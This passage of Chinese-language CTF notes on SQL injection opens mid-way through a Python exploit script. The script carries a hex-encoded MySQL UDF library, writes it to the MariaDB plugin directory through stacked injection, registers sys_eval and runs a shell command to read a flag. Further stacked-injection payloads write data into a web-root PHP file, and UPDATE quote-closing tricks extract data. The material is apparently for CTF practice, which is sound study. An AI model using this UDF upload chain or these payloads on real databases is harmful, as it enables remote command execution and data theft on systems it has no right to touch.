000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400'
codes=[]
for i in range(0,len(code),128):
    codes.append(code[i:min(i+128,len(code))])
 
#建临时表
sql='''create table temp(data longblob)'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#清空临时表
sql='''delete from temp'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#插入第一段数据
sql='''insert into temp(data) values (0x{})'''.format(codes[0])
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#更新连接剩余数据
for k in range(1,len(codes)):
    sql='''update temp set data = concat(data,0x{})'''.format(codes[k])
    payload='''0';{};-- A'''.format(sql)
    requests.get(url+payload)
 
#10.3.18-MariaDB    
#写入so文件
sql='''select data from temp into dumpfile '/usr/lib/mariadb/plugin/udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#引入自定义函数
sql='''create function sys_eval returns string soname 'udf.so\''''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#命令执行，结果更新到界面
sql='''update ctfshow_user set pass=(select sys_eval('cat /flag.her?'))'''
payload='''0';{};-- A'''.format(sql)
requests.get(url+payload)
 
#查看结果
r=requests.get(url[:-4]+'?page=1&limit=10')
print(r.text)
```

- sys_eval是执行系统命令



## 神奇闭合

### Insert

#### 0x01

- 可注入语句

```sql
INSERT INTO(filename,filepath,filetype) values('".$filename"','".$filepath"','".$filetype."')
```

- 如果filetype存在注入，那么可以

```sql
PC64 Emulator file""');select flag into file '/var/www/html/2.php';--+

#sql语句变成了下面的，本质上是堆叠注入

INSERT INTO(filename,filepath,filetype) values('".$filename"','".$filepath"',
'"PC64 Emulator file"');select flag into file '/var/www/html/2.php';--+"')
```

![29d7f5eea86063a7aa55a579ff0e20c.png](https://cdn.nlark.com/yuque/0/2022/png/29405061/1668001951695-b0bd80a3-6866-4088-a37c-f06638c3fe79.png#averageHue=%23352321&clientId=u28f216fd-6910-4&from=paste&height=70&id=TR7bK&originHeight=140&originWidth=2809&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35346&status=done&style=none&taskId=ub249bd91-481e-43eb-9835-bfa2ce6e67b&title=&width=1404.5)

### update

#### 0x01

```sql
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

- 这里可以先对Password处闭合，大括号可以不用管

```sql
password = 1',username = select group_concat(/*爆破信息*/) where 1=1#&username = 1

#sql语句就变成了

update ctfshow_user set pass = '1',username = select group_concat(/*爆破信息*/) 
where 1=1 #where username = '1';
```

- 如果过滤了单引号，考虑用\转义

```sql
password = \&username =,username= (select group_concat(/*爆破信息*/))#

#sql语句变成了

$sql = "update ctfshow_user set pass = '\' where username = ',
username= (select group_concat(/*爆破信息*/))#';";
```

- 这里一定要注意username=()中的括号，括号里面添加语句或者函数

## 总结

![](https://cdn.nlark.com/yuque/0/2023/jpeg/29405061/1683367334674-ccb86bee-4e2b-4298-82b6-4eb03200286b.jpeg)
# 
